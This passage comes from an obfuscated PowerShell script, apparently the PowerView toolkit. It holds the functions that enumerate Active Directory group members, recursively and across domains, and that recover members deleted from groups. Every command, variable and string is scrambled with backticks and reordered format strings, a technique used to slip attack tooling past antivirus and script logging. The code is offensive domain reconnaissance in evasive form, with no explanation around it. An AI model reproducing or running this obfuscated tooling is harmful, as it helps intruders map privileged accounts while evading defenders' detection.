        if (${PSB`o`UndP`Ar`AmETeRs}[("{1}{0}{2}" -f 'mb','To','stone')]) { ${SEARCHEra`Rg`UMEN`Ts}[("{1}{0}" -f 'bstone','Tom')] = ${ToMB`S`ToNE} }
        if (${psb`o`UN`dPa`RAMEtErs}[("{1}{2}{0}" -f 'l','Crede','ntia')]) { ${s`EARCHERarGu`m`ENTS}[("{0}{2}{1}" -f 'Cr','al','edenti')] = ${c`REd`E`NTIAl} }

        ${aDnAMea`RGu`mE`NTs} = @{}
        if (${pSBoUn`dParAm`et`e`RS}[("{1}{0}" -f 'ain','Dom')]) { ${aDNAM`e`AR`G`UmEN`Ts}[("{1}{0}{2}"-f 'i','Doma','n')] = ${Dom`A`IN} }
        if (${PS`B`ouNDPAram`eTErs}[("{1}{0}{2}"-f'erve','S','r')]) { ${a`DN`AmEARGu`me`NtS}[("{0}{1}" -f 'S','erver')] = ${SeR`V`er} }
        if (${ps`B`ouNDpArAm`eTe`Rs}[("{0}{2}{1}"-f 'Cred','tial','en')]) { ${aDNAme`Ar`Gu`mEnts}[("{2}{0}{1}" -f'de','ntial','Cre')] = ${c`R`EDE`NTiAL} }
    }

    PROCESS {
        ${grOu`PS`E`A`RcheR} = &("{2}{4}{0}{1}{3}"-f 'ch','e','Ge','r','t-DomainSear') @SearcherArguments
        if (${G`RO`UpS`eaRCHer}) {
            if (${ps`BoUn`DPA`RaME`TeRS}[("{0}{3}{1}{5}{2}{4}"-f'Rec','eUs','atchi','urs','ngRule','ingM')]) {
                ${S`EarcHe`RARGu`menTS}[("{1}{0}"-f 'ty','Identi')] = ${ID`En`TiTY}
                ${s`e`ArC`H`ERarguMe`NtS}['Raw'] = ${T`RuE}
                ${G`RoUP} = &("{1}{0}{3}{2}" -f'et','G','up','-DomainGro') @SearcherArguments

                if (-not ${GRo`Up}) {
                    &("{3}{1}{0}{2}"-f'ar','e-W','ning','Writ') ('[Get-Domai'+'n'+'G'+'roup'+'Me'+'mbe'+'r] '+'E'+'rro'+'r '+'s'+'e'+'arching '+'for'+' '+'grou'+'p '+'w'+'ith '+'i'+'dentity'+': '+"$Identity")
                }
                else {
                    ${G`R`O`UPfouNdnA`me} = ${GRO`Up}."P`RoPeRTi`ES".("{1}{0}"-f 'em','it').Invoke(("{1}{3}{2}{0}"-f 'me','sama','tna','ccoun'))[0]
                    ${gro`Up`F`OuNdDN} = ${gR`o`UP}."pROp`eRti`ES".("{1}{0}" -f'tem','i').Invoke(("{3}{2}{0}{4}{1}"-f 'n','ishedname','sti','di','gu'))[0]

                    if (${psB`Ou`NdpArAme`T`ers}[("{1}{0}"-f'main','Do')]) {
                        ${gRO`UP`FOu`NdDOMaiN} = ${Do`mA`In}
                    }
                    else {
                        
                        if (${gro`U`pFoU`NddN}) {
                            ${gR`oUpFoUndD`O`Ma`iN} = ${g`ROup`Fou`NDDn}.("{3}{0}{2}{1}" -f 'r','g','in','SubSt').Invoke(${G`R`o`UpfoUN`DdN}.("{0}{2}{1}"-f 'Index','f','O').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    &("{2}{1}{4}{0}{3}"-f'Ve','rite','W','rbose','-') ('[Get-'+'Do'+'m'+'ainGroupM'+'emb'+'e'+'r] '+'Usin'+'g '+'L'+'DAP '+'m'+'atchi'+'ng '+'rul'+'e '+'to'+' '+'recu'+'rse'+' '+'o'+'n '+"'$GroupFoundDN', "+'onl'+'y '+'u'+'ser '+'a'+'ccounts '+'wil'+'l '+'be'+' '+'retu'+'rne'+'d.')
                    ${Gr`ouPSear`c`HER}."Fi`lt`eR" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${G`Ro`Ups`eAR`cHEr}."pro`pert`iE`st`oLOad".("{2}{0}{1}" -f'dRa','nge','Ad').Invoke((("{2}{4}{1}{3}{0}" -f'e','shedNa','disti','m','ngui')))
                    ${meM`B`ErS} = ${Gr`oUps`EA`Rcher}.("{1}{0}" -f 'All','Find').Invoke() | &("{2}{0}{1}" -f'h-Obje','ct','ForEac') {${_}."pRo`P`ERtI`eS"."DIstinG`UiSh`Edna`Me"[0]}
                }
                ${nu`lL} = ${sea`Rche`R`AR`gumentS}.("{1}{0}"-f 'move','Re').Invoke('Raw')
            }
            else {
                ${IdENti`T`yFiLt`er} = ''
                ${f`ilter} = ''
                ${i`dEN`TIty} | &("{0}{1}{2}{3}" -f 'W','here','-Ob','ject') {${_}} | &("{2}{4}{3}{1}{0}"-f 'Object','ch-','F','Ea','or') {
                    ${i`deNt`IT`Yins`Ta`NcE} = ${_}.("{1}{2}{0}" -f 'ce','R','epla').Invoke('(', '\28').("{1}{0}{2}"-f'c','Repla','e').Invoke(')', '\29')
                    if (${IDe`NtITyINS`Tan`Ce} -match ("{0}{1}"-f'^','S-1-')) {
                        ${id`ENTitY`Fi`lteR} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${Ide`NtiTYIN`s`T`An`ce} -match ("{1}{0}" -f 'CN=','^')) {
                        ${IdeNtitY`Fil`T`eR} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${PS`Bound`param`ETE`Rs}[("{2}{1}{0}"-f'in','a','Dom')]) -and (-not ${PsbOuNDpaRa`M`e`TerS}[("{0}{1}{2}" -f'Searc','hBa','se')])) {
                            
                            
                            ${ideNt`i`T`yd`OMAIn} = ${ideNTi`Tyi`NsT`A`N`cE}.("{0}{1}" -f'Su','bString').Invoke(${Id`EN`TItyi`NstAn`ce}.("{1}{0}" -f 'f','IndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{2}{0}{1}" -f'e-Verbo','se','Writ') ('[Get-'+'DomainG'+'r'+'oupM'+'ember] '+'E'+'xtr'+'acted'+' '+'doma'+'in '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${S`e`ARcHERaRg`U`M`ENTs}[("{1}{0}" -f'main','Do')] = ${IDEn`TIt`Y`domA`iN}
                            ${G`R`oU`PsEArcHer} = &("{2}{4}{1}{0}{3}{5}" -f 'arc','Se','Ge','h','t-Domain','er') @SearcherArguments
                            if (-not ${G`Ro`UpSeaRC`HeR}) {
                                &("{0}{2}{3}{1}" -f'Write-Wa','g','rni','n') ('[G'+'e'+'t-DomainGr'+'oupMem'+'ber] '+'U'+'nab'+'le '+'to'+' '+'ret'+'riev'+'e '+'d'+'omain'+' '+'s'+'earcher'+' '+'fo'+'r '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${iDE`N`TITYINST`AnCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${GU`idByTest`RiNG} = (([Guid]${i`dEn`Tit`y`InstAN`CE}).("{1}{2}{0}" -f 'teArray','To','By').Invoke() | &("{3}{2}{0}{4}{1}" -f'h-Ob','ect','c','ForEa','j') { '\' + ${_}.("{1}{2}{0}" -f 'ring','ToS','t').Invoke('X2') }) -join ''
                        ${i`D`EN`Ti`TyfIlTer} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${IdeN`T`iTyIN`StA`N`CE}.("{0}{1}{2}"-f'C','onta','ins').Invoke('\')) {
                        ${COn`Ve`RTedi`dentItyIn`sTa`N`CE} = ${IDenT`I`Ty`in`s`TANce}.("{0}{1}"-f 'Repl','ace').Invoke('\28', '(').("{0}{2}{1}"-f 'R','ace','epl').Invoke('\29', ')') | &("{3}{0}{1}{2}" -f'vert-A','DNa','me','Con') -OutputType ("{0}{2}{1}" -f 'Canonic','l','a')
                        if (${CO`N`VERtEDidE`NTITYin`sT`AN`Ce}) {
                            ${g`Rou`p`DOMAIn} = ${CoN`VErted`idE`NT`iTyInst`ANce}.("{1}{2}{0}"-f 'tring','Su','bS').Invoke(0, ${Co`NvEr`T`edidenTi`TYiNstANce}.("{0}{2}{1}"-f'In','xOf','de').Invoke('/'))
                            ${gRo`U`pNA`mE} = ${iDenT`ityI`NST`A`NCe}.("{0}{1}" -f 'Spli','t').Invoke('\')[1]
                            ${I`DE`Nt`iTyfILter} += "(samAccountName=$GroupName)"
                            ${sEarC`HE`Ra`RGUme`N`TS}[("{1}{2}{0}" -f'ain','Do','m')] = ${g`ROu`Pdo`MAiN}
                            &("{0}{3}{2}{1}" -f 'Wr','e','bos','ite-Ver') ('['+'Ge'+'t-DomainGro'+'up'+'Me'+'mbe'+'r] '+'E'+'xtrac'+'ted'+' '+'dom'+'ai'+'n '+"'$GroupDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            ${G`R`OUp`sE`ArCHer} = &("{3}{0}{1}{2}" -f'S','e','archer','Get-Domain') @SearcherArguments
                        }
                    }
                    else {
                        ${IDE`Nt`It`YfILt`er} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${IdE`NTiTy`Fi`l`TER} -and (${I`d`e`NT`ItyfILTEr}.("{0}{1}"-f 'Tri','m').Invoke() -ne '') ) {
                    ${FIlT`eR} += "(|$IdentityFilter)"
                }

                if (${ps`B`ouNDpA`RA`M`eTers}[("{1}{2}{0}" -f'r','LD','APFilte')]) {
                    &("{0}{1}{2}" -f'Writ','e-Verb','ose') ('[Get'+'-DomainGroup'+'Memb'+'e'+'r] '+'U'+'s'+'ing '+'addition'+'a'+'l '+'LDA'+'P '+'fil'+'te'+'r: '+"$LDAPFilter")
                    ${fil`T`er} += "$LDAPFilter"
                }

                ${G`RoupS`EArCHer}."FI`LtEr" = "(&(objectCategory=group)$Filter)"
                &("{1}{0}{3}{2}" -f 'rit','W','e','e-Verbos') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    ${r`eSult} = ${grO`UP`sea`RCHEr}.("{0}{1}"-f'FindOn','e').Invoke()
                }
                catch {
                    &("{0}{2}{3}{1}" -f'Write-Wa','g','rn','in') ('[Get-Do'+'main'+'Grou'+'pMembe'+'r] '+'Err'+'or'+' '+'s'+'e'+'archi'+'ng '+'fo'+'r '+'gro'+'up'+' '+'w'+'ith '+'ide'+'ntit'+'y '+"'$Identity': "+"$_")
                    ${Me`M`Bers} = @()
                }

                ${Gr`O`Upf`oUnDNamE} = ''
                ${gro`UpF`OUNDdn} = ''

                if (${REs`ULT}) {
                    ${mE`m`BERS} = ${r`EsuLt}."pRoPE`RtI`eS".("{1}{0}" -f'm','ite').Invoke(("{1}{0}" -f 'ber','mem'))

                    if (${m`EMb`eRS}."C`oUNt" -eq 0) {
                        
                        ${FInIs`H`Ed} = ${FA`LsE}
                        ${bO`T`Tom} = 0
                        ${T`Op} = 0

                        while (-not ${finish`ED}) {
                            ${t`op} = ${BO`T`TOm} + 1499
                            ${mEM`B`erR`ANGE}="member;range=$Bottom-$Top"
                            ${BOTT`Om} += 1500
                            ${N`ULL} = ${gROuPS`E`A`RCH`ER}."P`RO`pE`RTIESTOLOad".("{0}{1}"-f'C','lear').Invoke()
                            ${Nu`lL} = ${G`Ro`U`pSeAr`Cher}."PrOPerTi`e`STo`LoAd".("{0}{1}" -f 'A','dd').Invoke("$MemberRange")
                            ${n`Ull} = ${GROU`Psear`c`HeR}."PrOP`eR`T`iEstoLO`AD".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{2}"-f 'maccount','sa','name'))
                            ${n`Ull} = ${Gr`Ou`pS`earch`eR}."p`ROp`eR`TIEstOL`oad".("{1}{0}"-f 'dd','A').Invoke(("{3}{0}{2}{1}"-f 'hedn','me','a','distinguis'))

                            try {
                                ${Re`sU`Lt} = ${gr`ouPSearc`h`ER}.("{0}{1}" -f'FindO','ne').Invoke()
                                ${r`ANG`Edpr`oPe`RtY} = ${rE`Su`lT}."PRO`PER`TiEs"."prOpE`Rtyna`MES" -like ("{3}{2}{0}{1}"-f'r;r','ange=*','mbe','me')
                                ${Me`Mb`eRs} += ${rE`suLT}."prOp`E`Rt`iES".("{0}{1}"-f 'i','tem').Invoke(${R`AnGedp`RO`PErTY})
                                ${gR`o`UpfoUn`dNAme} = ${R`ESu`lt}."Pr`opEr`TIEs".("{1}{0}" -f'em','it').Invoke(("{2}{1}{0}" -f 'untname','co','samac'))[0]
                                ${gr`oU`pF`oUnDdn} = ${re`SULt}."p`Rop`ert`IEs".("{1}{0}" -f 'em','it').Invoke(("{1}{0}{4}{2}{3}"-f 'i','dist','u','ishedname','ng'))[0]

                                if (${M`EMberS}."c`OunT" -eq 0) {
                                    ${Fin`i`Sh`eD} = ${tr`Ue}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${F`In`isheD} = ${t`Rue}
                            }
                        }
                    }
                    else {
                        ${grO`UP`FouNd`N`AmE} = ${Re`SULT}."PrO`p`Erti`ES".("{0}{1}"-f'i','tem').Invoke(("{3}{2}{0}{1}" -f'n','tname','amaccou','s'))[0]
                        ${G`RO`UpFoUN`dDn} = ${R`ESU`Lt}."PR`opE`RtIes".("{1}{0}" -f'em','it').Invoke(("{0}{3}{1}{2}{5}{4}"-f'di','is','hed','stingu','me','na'))[0]
                        ${MEm`BE`Rs} += ${R`Es`Ult}."pROp`erti`es".("{1}{0}"-f 'em','it').Invoke(${RanG`E`DPropeR`TY})
                    }

                    if (${pSbO`UNDPaRaM`et`eRS}[("{1}{0}"-f'n','Domai')]) {
                        ${groUpFOund`D`om`AIn} = ${DO`MAIN}
                    }
                    else {
                        
                        if (${G`Rou`pF`ouNddn}) {
                            ${gr`OUPf`oUndd`O`mA`In} = ${gROup`F`ou`NddN}.("{0}{1}" -f'Sub','String').Invoke(${G`ROuP`Found`dn}.("{1}{0}" -f'dexOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${m`eMb`Er} in ${Me`mB`ERs}) {
                if (${REC`U`Rse} -and ${UseMAT`chI`NGrU`le}) {
                    ${PRoPe`R`TIeS} = ${_}."P`R`OperTIES"
                }
                else {
                    ${O`BjecT`s`eARc`HeraRgUMeN`Ts} = ${S`EArcH`eRaR`GU`M`eNtS}.("{1}{0}" -f'e','Clon').Invoke()
                    ${ob`je`Ct`SEaRCheraR`g`UM`en`TS}[("{1}{2}{0}" -f 'y','Identi','t')] = ${me`mbEr}
                    ${ObJEcTSearcHeR`A`RG`UMen`Ts}['Raw'] = ${tR`UE}
                    ${o`B`j`eCTSea`Rche`RA`RGuMEnTS}[("{1}{2}{0}"-f'es','Pr','operti')] = ("{1}{9}{6}{0}{7}{2}{5}{3}{4}{8}"-f 'n','d',',cn,s','bj','ectsid,obje','amaccountname,o','tinguished','ame','ctclass','is')
                    ${oBj`e`cT} = &("{1}{2}{0}{3}"-f'-DomainOb','Ge','t','ject') @ObjectSearcherArguments
                    ${PRop`er`Ti`ES} = ${o`Bj`ECT}."PrOPe`RtI`eS"
                }

                if (${p`Ro`PErTI`ES}) {
                    ${GrOUP`M`e`mBER} = &("{2}{0}{1}" -f'Objec','t','New-') ("{2}{1}{0}"-f'ject','Ob','PS')
                    ${Gr`o`UPme`MBer} | &("{1}{3}{0}{2}"-f'Mem','Ad','ber','d-') ("{1}{2}{0}{3}"-f'pr','N','ote','operty') ("{0}{2}{1}{3}"-f'Gr','i','oupDoma','n') ${groUP`FOU`Nd`d`OmAIN}
                    ${G`ROup`MEMBer} | &("{3}{0}{1}{2}"-f 'dd-','M','ember','A') ("{2}{0}{1}{3}" -f'prope','r','Note','ty') ("{1}{0}"-f 'ame','GroupN') ${gROuPf`OU`Nd`NAmE}
                    ${GRouPm`e`MB`er} | &("{2}{0}{1}"-f 'd-Memb','er','Ad') ("{2}{0}{1}"-f 'er','ty','Noteprop') ("{5}{2}{3}{0}{1}{4}" -f'is','he','up','Distingu','dName','Gro') ${GRO`UPfo`U`ND`dn}

                    if (${P`ROPeR`TIes}."objE`Ct`SiD") {
                        ${mEmb`E`RSId} = ((&("{0}{1}{2}" -f 'New-','Obj','ect') ("{5}{2}{8}{4}{3}{7}{0}{6}{1}"-f'ecu','er','stem.Securi','pal.','nci','Sy','rityIdentifi','S','ty.Pri') ${PRO`pER`Ties}."O`BJE`CtSID"[0], 0)."VAL`UE")
                    }
                    else {
                        ${MeM`BErS`ID} = ${N`ULl}
                    }

                    try {
                        ${m`embeRdN} = ${PRO`pE`Rties}."Dist`iN`GuiSHed`N`Ame"[0]
                        if (${mEm`Be`Rdn} -match ((("{4}{2}{7}{5}{1}{3}{0}{9}{6}{8}" -f 'als{','ecurit','rei','yPrincip','Fo','S','}S-1-5-2','gn','1','0'))  -F  [cHAr]124)) {
                            try {
                                if (-not ${m`EMbe`RSID}) {
                                    ${Me`m`B`ERsID} = ${P`Rope`RTiES}."C`N"[0]
                                }
                                ${mE`mbeR`Si`MP`lenA`Me} = &("{2}{0}{3}{1}{4}" -f'-A','m','Convert','DNa','e') -Identity ${M`emBe`RSID} -OutputType ("{2}{0}{1}" -f'ain','Simple','Dom') @ADNameArguments

                                if (${mEM`BerS`IMPLE`N`AME}) {
                                    ${MeMB`Erd`O`MAiN} = ${memb`e`RSI`mpL`ENAMe}.("{1}{0}" -f 'plit','S').Invoke('@')[1]
                                }
                                else {
                                    &("{0}{2}{1}{3}"-f'Wr','e-Warnin','it','g') ('[Get-Do'+'m'+'ain'+'GroupM'+'e'+'mber'+'] '+'E'+'rror'+' '+'conv'+'er'+'t'+'ing '+"$MemberDN")
                                    ${MEMBeRDO`Ma`iN} = ${n`ULL}
                                }
                            }
                            catch {
                                &("{2}{3}{0}{1}"-f'e-War','ning','Wri','t') ('[Get-Dom'+'ainGr'+'ou'+'pMe'+'m'+'ber] '+'Erro'+'r '+'c'+'on'+'v'+'erting '+"$MemberDN")
                                ${meMbE`Rd`OMa`iN} = ${n`ULL}
                            }
                        }
                        else {
                            
                            ${MEM`BEr`DOM`A`IN} = ${Me`MBErdN}.("{1}{2}{0}" -f 'String','S','ub').Invoke(${Me`Mber`dN}.("{2}{1}{0}"-f 'xOf','de','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${m`E`mB`eRDN} = ${Nu`ll}
                        ${ME`m`BeR`dOma`In} = ${n`ULL}
                    }

                    if (${pr`Ope`RTi`ES}."SamacCoUN`Tn`AMe") {
                        
                        ${M`E`mberNAME} = ${p`ROpe`Rt`Ies}."s`A`M`ACCOuNTnA`me"[0]
                    }
                    else {
                        
                        try {
                            ${meMbe`RNa`Me} = &("{2}{4}{1}{0}{3}" -f 'rom-S','tF','C','ID','onver') -ObjectSID ${Pro`pER`TiEs}."cN"[0] @ADNameArguments
                        }
                        catch {
                            
                            ${m`eMbER`NA`me} = ${pr`o`p`ertIeS}."c`N"[0]
                        }
                    }

                    if (${p`Rope`Rti`eS}."O`BJECtCl`ASs" -match ("{0}{1}" -f 'compute','r')) {
                        ${MEmbErO`B`JeC`T`CLASs} = ("{0}{2}{1}" -f'co','ter','mpu')
                    }
                    elseif (${P`RoP`E`RTieS}."O`Bje`c`TcLASs" -match ("{0}{1}"-f 'g','roup')) {
                        ${M`eMbErO`BjeC`TcLaSs} = ("{0}{1}" -f 'grou','p')
                    }
                    elseif (${pro`p`eR`TiES}."objeCT`cla`ss" -match ("{0}{1}" -f 'use','r')) {
                        ${membEro`B`J`ectcL`ASs} = ("{0}{1}" -f'use','r')
                    }
                    else {
                        ${mE`M`Be`Ro`B`jECtClAsS} = ${N`UlL}
                    }
                    ${grO`Upme`Mb`eR} | &("{2}{0}{3}{1}"-f 'd-','mber','Ad','Me') ("{0}{2}{1}"-f 'No','ty','teproper') ("{2}{0}{1}{3}" -f'rDom','ai','Membe','n') ${MEM`BER`DOmAIn}
                    ${G`RoU`pmembeR} | &("{1}{0}{2}" -f 'emb','Add-M','er') ("{3}{2}{1}{0}"-f 'perty','tepro','o','N') ("{1}{3}{2}{0}" -f'e','Mem','rNam','be') ${MeM`BE`RNA`me}
                    ${GR`oUp`MeMb`ER} | &("{0}{1}{2}"-f 'Add','-Mem','ber') ("{2}{1}{0}{3}"-f'e','oteprop','N','rty') ("{2}{0}{7}{6}{4}{5}{3}{1}" -f 'em','dName','M','nguishe','s','ti','rDi','be') ${MEM`BEr`dn}
                    ${g`RouPME`mb`er} | &("{2}{0}{1}"-f 'Memb','er','Add-') ("{0}{3}{2}{1}" -f'Notepr','y','rt','ope') ("{4}{2}{0}{3}{1}"-f'erO','tClass','mb','bjec','Me') ${Me`M`BeRoBJ`EC`TcLasS}
                    ${grO`UPm`E`MbeR} | &("{0}{2}{1}" -f'Add-','er','Memb') ("{1}{2}{0}"-f'perty','No','tepro') ("{0}{2}{3}{1}"-f'Me','D','mber','SI') ${m`E`mBERs`id}
                    ${GrO`Up`M`EmbER}."Pso`BJecT"."T`yPEN`AMEs".("{0}{2}{1}"-f 'In','rt','se').Invoke(0, ("{1}{0}{2}{4}{5}{3}" -f 'we','Po','rV','Member','i','ew.Group'))
                    ${grOUpM`E`mBEr}

                    
                    if (${PSBo`UNdPA`RaMEtE`RS}[("{0}{1}"-f 'Rec','urse')] -and ${Me`M`BerDn} -and (${me`m`BeroBJ`E`Ctc`lAss} -match ("{1}{0}"-f 'roup','g'))) {
                        &("{1}{3}{2}{0}"-f 'ose','Write','b','-Ver') ('['+'Get-'+'Domain'+'Gro'+'upMe'+'mber'+'] '+'M'+'anu'+'ally '+'rec'+'ursing'+' '+'on'+' '+'grou'+'p'+': '+"$MemberDN")
                        ${SEaRcHE`RA`R`GUMENts}[("{1}{2}{0}" -f'y','Ide','ntit')] = ${mEM`BER`Dn}
                        ${nu`ll} = ${SeArCh`eRa`RGU`MeNtS}.("{0}{1}" -f 'Remov','e').Invoke(("{1}{2}{0}"-f'ies','Proper','t'))
                        &("{0}{3}{1}{2}"-f'Get-Domain','upM','ember','Gro') @SearcherArguments
                    }
                }
            }
            ${GRO`UP`SEarCH`er}.("{2}{1}{0}"-f'e','pos','dis').Invoke()
        }
    }
}


function G`Et-DoMAiNgr`OUpMEm`B`e`RDeLeteD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{6}{7}{5}{1}{3}{4}" -f'P','edVarsMoreTha','SU','nAssig','nments','r','seDe','cla'}, '')]
    [OutputType({"{6}{7}{0}{3}{1}{5}{2}{4}{8}" -f'V','nGrou','em','iew.Domai','berDel','pM','Powe','r','eted'})]
    [CmdletBinding()]
    Param(
        [Parameter(posItion = 0, VaLueFROMpIpELINE = ${tr`Ue}, vAlueFrOMpIpelinEBYPropErTYNamE = ${tR`Ue})]
        [Alias({"{1}{3}{0}{2}"-f'hedNam','Distin','e','guis'}, {"{3}{2}{0}{4}{1}" -f'cco','ntName','mA','Sa','u'}, {"{0}{1}" -f 'N','ame'}, {"{4}{2}{3}{6}{5}{0}{1}"-f'g','uishedName','e','mberD','M','stin','i'}, {"{0}{2}{1}{3}" -f'Memb','am','erN','e'})]
        [String[]]
        ${Id`EN`T`ITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'er','Filt'})]
        [String]
        ${L`dAPfI`l`Ter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'A','D','SPath'})]
        [String]
        ${S`EA`R`cHbAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{5}{0}{2}{1}{3}{4}"-f 'm','t','ainCon','roll','er','Do'})]
        [String]
        ${S`E`RVer},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{1}{2}{0}" -f 'el','On','eLev'}, {"{1}{2}{0}" -f'ee','Su','btr'})]
        [String]
        ${Se`Ar`CH`SCOPE} = ("{1}{0}{2}"-f'u','S','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResuLTPaG`ES`i`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERVerti`mEl`IM`IT},

        [Switch]
        ${tO`M`BSTo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`deNti`AL} =   (  vaRIabLE  ('qf'+'N') -vaLUeoNL  )::"Emp`TY",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${S`EAr`Cher`ArGUm`eN`Ts} = @{
            ("{0}{2}{3}{1}" -f'P','perties','r','o')    =   ("{1}{3}{4}{2}{5}{0}{6}" -f 'ta','m','plvalu','sds','-re','eme','data'),("{1}{3}{2}{0}" -f 'me','dis','ishedna','tingu')
            'Raw'           =   ${T`RUe}
            ("{0}{2}{1}" -f 'LDA','ter','PFil')    =   ("{1}{5}{4}{0}{3}{6}{2}"-f'tCat','(o','y=group)','ego','ec','bj','r')
        }
        if (${psB`OUNDPAra`MeT`eRS}[("{0}{1}" -f 'Do','main')]) { ${S`EArCh`ER`ARgUMeNtS}[("{0}{1}" -f'D','omain')] = ${d`OMaiN} }
        if (${pS`BouNDpa`R`AMeT`ERS}[("{1}{2}{0}"-f'ter','L','DAPFil')]) { ${SEa`RCher`Ar`gUmENtS}[("{0}{2}{1}" -f'LDA','lter','PFi')] = ${lDaP`F`iLt`Er} }
        if (${ps`BOUn`dPa`RaM`Eters}[("{0}{2}{1}" -f 'Sear','Base','ch')]) { ${S`earcHe`RargUMe`NTS}[("{1}{0}{2}"-f 'earc','S','hBase')] = ${sEA`RChba`se} }
        if (${ps`Bo`U`Ndpa`R`AmeTErS}[("{1}{0}"-f'er','Serv')]) { ${s`earChera`RGUmEN`Ts}[("{2}{0}{1}" -f've','r','Ser')] = ${sE`Rv`ER} }
        if (${PsboUndPAR`A`mEtE`RS}[("{1}{0}{2}" -f 'Scop','Search','e')]) { ${s`Ea`Rc`HErA`RGUmeNTS}[("{0}{2}{1}{3}" -f'Sear','hSco','c','pe')] = ${SEAR`cH`sc`OPe} }
        if (${p`sbo`Undpa`RAmeTErs}[("{2}{1}{0}"-f 'ize','S','ResultPage')]) { ${sE`AR`CHerar`g`UMe`NtS}[("{0}{3}{2}{1}"-f'Res','e','ageSiz','ultP')] = ${RE`sUL`TP`AgEsize} }
        if (${Ps`BOun`D`P`AraMEtERS}[("{0}{3}{2}{1}" -f'Se','eLimit','im','rverT')]) { ${SeARchERaR`G`UME`Nts}[("{2}{1}{3}{0}"-f'it','verTime','Ser','Lim')] = ${servERtiM`E`LI`MIt} }
        if (${P`SB`Ou`NdPaRA`M`ETeRS}[("{0}{1}{2}"-f'To','mbston','e')]) { ${SeaRcHer`ArgU`me`NTs}[("{1}{0}{2}"-f'mbs','To','tone')] = ${TOMbS`T`One} }
        if (${Ps`BoUnD`parAmEte`Rs}[("{0}{1}{2}"-f 'Creden','t','ial')]) { ${seAr`ch`eRa`RG`UmE`NtS}[("{2}{1}{0}"-f'tial','n','Crede')] = ${c`ReDe`N`TIAl} }
    }

    PROCESS {
        if (${P`sBOUNd`P`AraMe`TERs}[("{1}{0}{2}"-f 'ti','Iden','ty')]) { ${s`EARcheRA`R`Gu`MeNtS}[("{0}{2}{1}"-f 'I','entity','d')] = ${id`eNtI`Ty} }

        &("{0}{1}{2}{3}{4}" -f'Ge','t-Domain','O','bjec','t') @SearcherArguments | &("{2}{0}{1}{3}" -f'-O','bj','ForEach','ect') {
            ${o`Bj`E`cTDN} = ${_}."p`ROPerti`es"[("{2}{3}{1}{0}"-f 'dname','he','disting','uis')][0]
            ForEach(${XmLNO`DE} in ${_}."PR`op`ErtIEs"[("{2}{1}{3}{4}{0}"-f'ata','p','msds-re','lvaluem','etad')]) {
                ${T`EMP`Object} = [xml]${XMlN`o`dE} | &("{4}{1}{3}{2}{0}"-f'ct','e','e','lect-Obj','S') -ExpandProperty ("{3}{0}{2}{5}{1}{4}" -f'EP','E','L_','DS_R','TA_DATA','VALUE_M') -ErrorAction ("{0}{4}{3}{1}{2}" -f 'S','tin','ue','on','ilentlyC')
                if (${Te`mp`objE`cT}) {
                    if ((${Te`Mp`oBjECt}."ps`z`AtTRi`BuT`eNamE" -Match ("{1}{0}" -f'ember','m')) -and ((${TEMpOB`j`E`cT}."d`WVER`SioN" % 2) -eq 0 )) {
                        ${outP`UT} = &("{1}{0}{3}{2}" -f'-','New','ct','Obje') ("{0}{2}{1}"-f'PS','bject','O')
                        ${o`Ut`pUt} | &("{1}{2}{0}"-f 'er','Add','-Memb') ("{1}{0}{2}{3}" -f'Proper','Note','t','y') ("{2}{1}{0}"-f 'upDN','ro','G') ${OBJE`cTDn}
                        ${Ou`T`pUt} | &("{1}{0}{2}"-f'be','Add-Mem','r') ("{1}{2}{3}{0}" -f'ty','Note','Prope','r') ("{2}{0}{1}" -f'e','rDN','Memb') ${tEMp`OBJE`Ct}."psZO`B`j`EcTDN"
                        ${OU`T`put} | &("{2}{0}{1}{3}" -f'dd','-','A','Member') ("{0}{2}{1}{3}" -f'N','op','otePr','erty') ("{2}{3}{0}{1}{4}"-f'rstA','dde','T','imeFi','d') ${TEMpo`B`JEcT}."FTImeC`R`E`ATED"
                        ${Ou`Tp`UT} | &("{2}{0}{3}{1}"-f 'dd-M','er','A','emb') ("{1}{2}{3}{0}"-f 'y','N','oteProper','t') ("{3}{1}{0}{2}" -f 'et','imeDel','ed','T') ${Te`mPoB`jecT}."fTIm`E`Del`eTED"
                        ${o`UtpUt} | &("{0}{2}{1}" -f'Add','ber','-Mem') ("{0}{1}{2}" -f'Not','ePr','operty') ("{0}{1}{2}{3}{5}{4}"-f'Last','O','ri','ginati','Change','ng') ${TEmp`OBj`EcT}."f`TimeL`AsTORiG`INA`TIN`gChan`GE"
                        ${out`puT} | &("{2}{1}{0}"-f 'ember','d-M','Ad') ("{0}{2}{1}" -f 'Not','rty','ePrope') ("{1}{3}{0}{2}"-f'de','Time','d','sAd') (${t`e`mPO`BJecT}."d`wvEr`sIOn" / 2)
